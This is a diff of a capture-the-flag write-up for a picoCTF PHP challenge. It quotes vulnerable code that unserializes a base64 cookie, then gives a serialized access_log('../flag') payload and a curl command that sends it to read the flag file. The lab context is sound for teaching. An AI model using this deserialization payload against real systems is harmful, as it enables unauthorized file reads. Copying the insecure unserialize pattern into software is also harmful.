@@ -154,7 +154,26 @@ if(isset($_COOKIE["login"])){
 ?>
 ```
 
-There is a `permissions` object. And, if `login` cookie is set, it tries to decode the cookie into a `permissions` object. If there is an error it prints the object contents. Printing the object contents means calling the `.__toString` method of an object. Whatever the `.__toString` method returns is what get's printed onto the screen.
+Now in this part. 
+
+```php
+<?php
+if(isset($_COOKIE["login"])){
+	try{
+		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+		$g = $perm->is_guest();
+		$a = $perm->is_admin();
+	}
+	catch(Error $e){
+		die("Deserialization error. ".$perm);
+	}
+}
+?>
+```
+
+It unserializes the cookie into a php object. And if the object dosen't have an `is_admin` or an `is_guest` method. We print the object contents.
+
+Printing the object contents means calling the `.__toString` method of an object. Whatever the `.__toString` method returns is what get's printed onto the screen.
 
 Now let's look at the second file.
 
@@ -251,7 +270,7 @@ The plan:
 
 1. Create a fake object string with `serialize(access_log("../flag"))`. Use this online php [compiler](http://sandbox.onlinephpfunctions.com) 
 2. Encode it with base64.
-3. Pass the encoded string as `login` cookie to `authentication.php`. You can do this with curl or the `devtools` from your browser.
+3. Pass the encoded string as `login` cookie to `authentication.php`. You can do this with `curl` or the `devtools` from your browser.
 
 ```console
 $ curl -v --cookie 'login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9' mercury.picoctf.net:2148/authentication.php
